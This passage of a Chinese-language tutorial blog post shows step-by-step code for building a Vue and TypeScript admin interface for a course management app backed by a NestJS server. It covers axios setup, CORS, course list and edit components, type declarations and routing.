]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>在 admin 中<code>yarn add axios @types/axios</code>，因为 axios 在 js 的包，所以需要加上<code>@types/axios</code>以起到代码提示作用，并在<code>admin\src\main.ts</code>中引入 axios 及创建其对应的全局变量\$http</li></ul><blockquote><p>admin\src\main.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">"./App.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./plugins/element"</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">"./router"</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">"axios"</span>; <span class="comment">// 引入axios</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使axios以$http的形式在全局使用，通过创建实例，将axios的请求与服务端地址对接</span></span><br><span class="line">Vue.prototype.$http = axios.create(&#123;</span><br><span class="line">  baseURL: <span class="string">"http://localhost:3000"</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>);</span><br></pre></td></tr></table></figure><ul><li>新建课程列表组件<code>admin\src\views\courses\CourseList.vue</code>。请求列表的时候，若提示跨域，需要在<code>server\apps\admin\src\main.ts</code>中加上<code>app.enableCors();</code>以允许跨域</li></ul><blockquote><p>admin\src\views\courses\CourseList.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>课程列表<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">"data.data"</span> <span class="attr">border</span> <span class="attr">stripe</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-for</span>=<span class="string">"(field, name) in fields"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:prop</span>=<span class="string">"name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:key</span>=<span class="string">"name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:label</span>=<span class="string">"field.label"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:width</span>=<span class="string">"field.width"</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">CourseList</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line">    data = &#123;&#125;;</span><br><span class="line">    fields = &#123;</span><br><span class="line"><span class="actionscript">      _id: &#123; label: <span class="string">"ID"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">      name: &#123; label: <span class="string">"课程名称"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">      cover: &#123; label: <span class="string">"课程封面图"</span> &#125;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetch() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">"courses"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    created() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>server\apps\admin\src\main.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; NestFactory &#125; <span class="keyword">from</span> <span class="string">"@nestjs/core"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; SwaggerModule, DocumentBuilder &#125; <span class="keyword">from</span> <span class="string">"@nestjs/swagger"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppModule &#125; <span class="keyword">from</span> <span class="string">"./app.module"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> NestFactory.create(AppModule);</span><br><span class="line">  app.enableCors();</span><br><span class="line">  <span class="keyword">const</span> options = <span class="keyword">new</span> DocumentBuilder()</span><br><span class="line">    .setTitle(<span class="string">"Mimikyu后台管理API"</span>)</span><br><span class="line">    .setDescription(<span class="string">"供后台界面调用的服务端API"</span>)</span><br><span class="line">    .setVersion(<span class="string">"1.0"</span>)</span><br><span class="line">    .build();</span><br><span class="line">  <span class="keyword">const</span> <span class="built_in">document</span> = SwaggerModule.createDocument(app, options);</span><br><span class="line">  SwaggerModule.setup(<span class="string">"api-docs"</span>, app, <span class="built_in">document</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> app.listen(<span class="number">3000</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"api-docs is working  http://localhost:3000/api-docs"</span>);</span><br><span class="line">&#125;</span><br><span class="line">bootstrap();</span><br></pre></td></tr></table></figure><ul><li>在路由中加入课程列表组件作为与 home 同级的子路由</li></ul><blockquote><p>admin\src\router\index.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">  name: <span class="string">"course-list"</span>,</span><br><span class="line">  path: <span class="string">"/course/list"</span>,</span><br><span class="line">  component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/courses/CourseList.vue"</span>)</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>解决当前<code>admin\src\main.ts</code>及<code>admin\src\router\index.ts</code>等文件报错，在<code>admin\src\shims-vue.d.ts</code>同级目录下，新建<code>admin\src\custom-vue.d.ts</code>,代码如下</li></ul><blockquote><p>admin\src\shims-vue.d.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">module</span> "*.vue" &#123;</span><br><span class="line">  <span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> Vue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该部分copy到admin\src\custom-vue.d.ts中去</span></span><br><span class="line"><span class="comment">// import Vue from "vue";</span></span><br><span class="line"><span class="comment">// import &#123; AxiosInstance &#125; from "axios";</span></span><br><span class="line"><span class="comment">// declare module "vue/types/vue" &#123;</span></span><br><span class="line"><span class="comment">//   interface Vue &#123;</span></span><br><span class="line"><span class="comment">//     $http: AxiosInstance;</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>admin\src\custom-vue.d.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AxiosInstance &#125; <span class="keyword">from</span> <span class="string">"axios"</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">module</span> "vue/types/vue" &#123;</span><br><span class="line">  <span class="keyword">interface</span> Vue &#123;</span><br><span class="line">    $http: AxiosInstance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>完成上述两个文件的编程后，若<code>admin\src\views\courses\CourseList.vue</code>中的<code>$http</code>报错，可以按<code>F1</code>键，输入<code>重新加载窗口</code>并回车确认，即可。</p></li><li><p>新建编辑（创建）课程组件<code>admin\src\views\courses\CourseEdit.vue</code>,其中使用了<a href="https://www.npmjs.com/package/vue-ele-form" rel="external nofollow noopener noreferrer" target="_blank"><code>vue-ele-form</code></a>组件，需要<code>yarn add vue-ele-form</code>，并在<code>admin\src\main.ts</code>中注册使用，注册 vue-ele-form 后，由于 vue-ele-form 不是基于 ts 语言开发的，因此若遇到提示<code>无法找到模块“vue-ele-form”的声明文件。</code>，则需要去声明一下。在<code>admin\src\main.ts</code>同级目录下新建<code>admin\src\packages.d.ts</code>,输入下方代码去声明该模块，每当调整 x.d.ts 文件时，推荐重启项目。</p></li></ul><p><code>yarn add vue-ele-form</code></p><blockquote><p>admin\src\main.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span> EleForm <span class="keyword">from</span> <span class="string">'vue-ele-form'</span> <span class="comment">// 引入</span></span><br><span class="line">...</span><br><span class="line">Vue.use(EleForm) <span class="comment">// 注册</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\packages.d.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">module</span> "vue-ele-form" &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">const</span> install: <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\views\courses\CourseEdit.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; isNew ? "创建" : "编辑" &#125;&#125;课程<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ele-form</span> <span class="attr">:form-data</span>=<span class="string">"data"</span> <span class="attr">:form-desc</span>=<span class="string">"fields"</span> <span class="attr">:request-fn</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ele-form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component, Prop &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">CourseEdit</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 可通过在路由中定义props:true，且带上:id作为参数，则可在当前页面通过@Prop获取到路由携带的id参数（注意：由于id初始化时没有赋值，需要在冒号前加上!，形成id!:string）</span></span></span><br><span class="line"><span class="javascript">    @Prop(<span class="built_in">String</span>) id!: string;</span></span><br><span class="line">    data = &#123;&#125;;</span><br><span class="line">    fields = &#123;</span><br><span class="line"><span class="actionscript">      name: &#123; label: <span class="string">"课程名称"</span>, type: <span class="string">"input"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">      cover: &#123; label: <span class="string">"课程封面图"</span>, type: <span class="string">"input"</span> &#125;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// --- 计算属性 ---</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 没有id，则为创建，为new，相反有id，则为编辑。</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">get</span> isNew() &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">return</span> !<span class="keyword">this</span>.id;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> submit(data) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="comment">// 在此无法使用console.log()，故加上global，全局使用</span></span></span><br><span class="line"><span class="actionscript">      <span class="comment">// global.console.log("data:", data);</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> url = <span class="keyword">this</span>.isNew ? <span class="string">`courses`</span> : <span class="string">`courses/<span class="subst">$&#123;<span class="keyword">this</span>.id&#125;</span>`</span>; <span class="comment">// 区分创建还是编辑的url</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">const</span> method = <span class="keyword">this</span>.isNew ? <span class="string">"post"</span> : <span class="string">"put"</span>; <span class="comment">// 区分创建还是编辑的请求方式</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http[method](url, data);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"保存成功!"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = &#123;&#125;;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$router.go(<span class="number">-1</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetch() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">`courses/<span class="subst">$&#123;<span class="keyword">this</span>.id&#125;</span>`</span>); <span class="comment">// 获取路由中携带的id作为查询条件，获取该id对应的数据，作为编辑操作时的默认值</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    created() &#123;</span><br><span class="line"><span class="actionscript">      !<span class="keyword">this</span>.isNew &amp;&amp; <span class="keyword">this</span>.fetch(); <span class="comment">// 若不能创建，则请求数据作为默认值</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>在<code>admin\src\router\index.ts</code>路由文件中加入上述组件作为与<code>course-list</code>同级的路由。</li></ul><blockquote><p>admin\src\router\index.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">  name: <span class="string">"course-list"</span>,</span><br><span class="line">  path: <span class="string">"/courses/list"</span>,</span><br><span class="line">  component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/courses/CourseList.vue"</span>)</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">  name: <span class="string">"course-edit"</span>,</span><br><span class="line">  path: <span class="string">"/courses/edit/:id"</span>, <span class="comment">// 在路由带上id作为参数，以确定编辑哪个列表</span></span><br><span class="line">  component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/courses/CourseEdit.vue"</span>),</span><br><span class="line">  props:<span class="literal">true</span>, <span class="comment">// 允许当前路由接受参数</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">  name: <span class="string">"course-create"</span>,</span><br><span class="line">  path: <span class="string">"/courses/create"</span>,</span><br><span class="line">  component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/courses/CourseEdit.vue"</span>)</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>此时，由于上述<code>course-edit</code>与<code>course-create</code>引用了同一个组件，可能回导致两个路由切换时不会更新数据，因此需要修改一下<code>admin\src\views\Main.vue</code></li></ul><blockquote><p>在 router-view 中，以\$route.path 为 key，防止切换不同路由，相同组件间出现数据不更新问题</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">el-main</span> <span class="attr">height</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Main content --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span> <span class="attr">:key</span>=<span class="string">"$route.path"</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-main</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>为<code>admin\src\views\courses\CourseList.vue</code>加上编辑删除模块,输入<code>eltc</code>可扩展成<el-table-column>，其他如下代码所示，主要新增的有 3 点。</el-table-column></li></ul><blockquote><p>admin\src\views\courses\CourseList.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>课程列表<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.添加跳转至新增 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">type</span>=<span class="string">"success"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">size</span>=<span class="string">"small"</span></span></span><br><span class="line"><span class="tag">        @<span class="attr">click</span>=<span class="string">"$router.push('/courses/create')"</span></span></span><br><span class="line"><span class="tag">        &gt;</span>创建课程<span class="tag">&lt;/<span class="name">el-button</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">"data.data"</span> <span class="attr">border</span> <span class="attr">stripe</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-for</span>=<span class="string">"(field, name) in fields"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:prop</span>=<span class="string">"name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:key</span>=<span class="string">"name"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:label</span>=<span class="string">"field.label"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:width</span>=<span class="string">"field.width"</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 2. 添加“编辑”，“删除” --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"操作"</span> <span class="attr">:width</span>=<span class="string">"200"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot</span>=<span class="string">"&#123; row &#125;"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-button</span></span></span><br><span class="line"><span class="tag">            <span class="attr">size</span>=<span class="string">"small"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">"success"</span></span></span><br><span class="line"><span class="tag">            @<span class="attr">click</span>=<span class="string">"$router.push(`/courses/edit/$&#123;row._id&#125;`)"</span></span></span><br><span class="line"><span class="tag">            &gt;</span>编辑<span class="tag">&lt;/<span class="name">el-button</span></span></span><br><span class="line"><span class="tag">          &gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">size</span>=<span class="string">"small"</span> <span class="attr">type</span>=<span class="string">"danger"</span> @<span class="attr">click</span>=<span class="string">"remove(row)"</span></span></span><br><span class="line"><span class="tag">            &gt;</span>删除<span class="tag">&lt;/<span class="name">el-button</span></span></span><br><span class="line"><span class="tag">          &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">CourseList</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line">    data = &#123;&#125;;</span><br><span class="line">    fields = &#123;</span><br><span class="line"><span class="actionscript">      _id: &#123; label: <span class="string">"ID"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">      name: &#123; label: <span class="string">"课程名称"</span> &#125;,</span></span><br><span class="line"><span class="actionscript">      cover: &#123; label: <span class="string">"课程封面图"</span> &#125;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetch() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">"courses"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="comment">// 3. 加上对应的“删除”功能</span></span></span><br><span class="line"><span 